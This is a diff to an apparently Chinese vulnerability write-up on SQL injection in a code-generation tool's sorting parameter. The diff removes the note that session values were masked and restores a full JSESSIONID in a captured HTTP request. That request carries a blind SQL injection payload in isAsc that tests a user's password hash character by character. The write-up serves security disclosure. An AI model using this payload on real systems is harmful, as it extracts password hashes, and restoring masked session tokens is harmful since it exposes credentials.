@@ -20,7 +20,6 @@ schema_version: "1"
 
 ## 核对与使用边界
 
-- 凭据处理：本文抓包中的可识别会话/防伪或认证值已仅将中段替换为星号，保留首尾及原长度便于对照；遮罩后的历史值不能作为可用登录凭据。原操作、请求方法和攻击表达式保留。
 
 本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。
 
@@ -32,7 +31,7 @@ schema_version: "1"
 
 - **适用与权限边界（1）**：任意SQL功能与越权注入边界未说明；依据：代码生成创建本来处理DDL，需要说明仅授权CREATE的防护如何被绕过，而非执行SQL即漏洞。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。
 
-- **凭据与会话边界（2）**：多个机制未拆分且身份材料未占位；依据：4.8.2 isAsc排序信道不同于createTable；保留完整JSESSIONID与CSRF令牌。抓包中的会话不能视为未认证访问证明；可识别的真实会话值按中段星号遮罩处理，默认演示值和攻击语法保留。需重新取得授权测试会话，不能复用文中值。
+- **凭据与会话边界（2）**：多个机制未拆分且认证前提待核；依据：4.8.2 isAsc排序信道不同于createTable；保留完整JSESSIONID与CSRF令牌。抓包中的会话不能视为未认证访问证明。需重新取得授权测试会话，不能复用文中值。
 
 历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。
 
@@ -78,7 +77,7 @@ Origin: http://192.168.3.102
 Referer: http://192.168.3.102/tool/gen/createTable
 Accept-Encoding: gzip, deflate, br
 Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
-Cookie: JSESSIONID=062******************************1ea
+Cookie: JSESSIONID=0627cca5-d25b-4156-8f9e-b48eb4d0d1ea
 Connection: keep-alive
 
 pageNum=1&pageSize=10&orderByColumn=status&isAsc=,CASE WHEN u.user_id LIKE 2 THEN CASE WHEN u.password LIKE 0x24326125 THEN 0 ELSE 2 END ELSE 1 END
